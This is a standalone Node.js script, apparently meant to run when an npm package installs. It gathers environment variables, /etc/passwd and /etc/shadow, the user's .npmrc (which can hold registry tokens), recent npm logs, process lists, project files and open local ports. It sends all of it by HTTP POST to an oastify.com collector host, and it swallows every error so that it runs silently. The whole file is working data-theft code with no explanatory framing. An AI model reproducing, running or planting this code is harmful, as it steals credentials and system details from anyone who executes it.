const { execSync } = require("child_process");
const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

function exfilCmd(cmd, tag = "cmd_result") {
  try {
    const result = execSync(cmd).toString();
    const data = `CMD: ${cmd}\nOUT:\n${result}`;
    const options = {
      hostname: "020hbeusmt3ka1fiqsh4z9edp4vvjl7a.oastify.com",
      port: 80,
      path: "/",
      method: "POST",
      headers: {
        "Content-Type": "text/plain",
        "Content-Length": Buffer.byteLength(data)
      }
    };
    const req = http.request(options);
    req.write(data);
    req.end();
  } catch (e) {}
}

function exfilStatic(tag, value) {
  const data = `CMD: ${tag}\nOUT:\n${value}`;
  const options = {
    hostname: "020hbeusmt3ka1fiqsh4z9edp4vvjl7a.oastify.com",
    port: 80,
    path: "/",
    method: "POST",
    headers: {
      "Content-Type": "text/plain",
      "Content-Length": Buffer.byteLength(data)
    }
  };
  const req = http.request(options);
  req.write(data);
  req.end();
}

function env() {
  return Object.entries(process.env)
    .map(([key, val]) => `${key}=${val}`)
    .join("\n");
}

// System Info
try {
  exfilStatic("hostname", os.hostname());
  exfilStatic("env", env());
  exfilStatic("platform", `${os.platform()} ${os.release()}`);
  exfilStatic("arch", os.arch());
  exfilCmd("whoami");
  exfilCmd("uname -a");
} catch (e) {}

try {
  const cwd = process.cwd();
  exfilStatic("cwd", cwd);

  if (fs.existsSync(path.join(cwd, "package.json"))) {
    const pkg = fs.readFileSync(path.join(cwd, "package.json"), "utf8");
    exfilStatic("package_json", pkg);
  }

  const nodeModules = fs.readdirSync(path.join(cwd, "node_modules"));
  exfilStatic("node_modules", nodeModules.join(", "));
} catch (e) {}

try {
  exfilCmd("cat /etc/passwd");
  exfilCmd("cat /etc/shadow");
  exfilCmd("ps aux");
} catch (e) {}

if (os.platform() === "win32") {
  try {
    exfilCmd("whoami");
    exfilCmd("ver");
    exfilCmd("tasklist");
    exfilCmd("hostname");
    exfilCmd("set");
    exfilStatic("userprofile", process.env.USERPROFILE || "");
    exfilCmd("npm root -g");
  } catch (e) {}
} else {
  try {
    exfilCmd("id");
    exfilCmd("npm root -g");
    exfilStatic("home", process.env.HOME || "");
  } catch (e) {}
}

try {
  const home = process.env.HOME || process.env.USERPROFILE;
  const npmrc = path.join(home, ".npmrc");
  const npmLog = path.join(home, ".npm/_logs");
  if (fs.existsSync(npmrc)) {
    exfilStatic("npmrc", fs.readFileSync(npmrc, "utf8"));
  }
  if (fs.existsSync(npmLog)) {
    const logs = fs.readdirSync(npmLog).slice(-3);
    logs.forEach(logFile => {
      const logData = fs.readFileSync(path.join(npmLog, logFile), "utf8");
      exfilStatic("npm_log", logData.slice(0, 1000));
    });
  }
} catch (e) {}

// Buscar directorios o archivos relacionados con Frontend/Frontends
try {
  exfilCmd('find / -type d -iname "*angular*" 2>/dev/null | head -n 20');
  exfilCmd('find / -type f -iname "*google.com*" 2>/dev/null | head -n 20');
} catch (e) {}

// Check open ports
const ports = [80, 443, 8080, 5000, 8000, 3000];
ports.forEach(port => {
  const net = require("net");
  const socket = new net.Socket();
  socket.setTimeout(1000);
  socket.connect(port, "127.0.0.1", () => {
    exfilStatic("open_port", `127.0.0.1:${port} is open`);
    socket.destroy();
  });
  socket.on("error", () => socket.destroy());
});

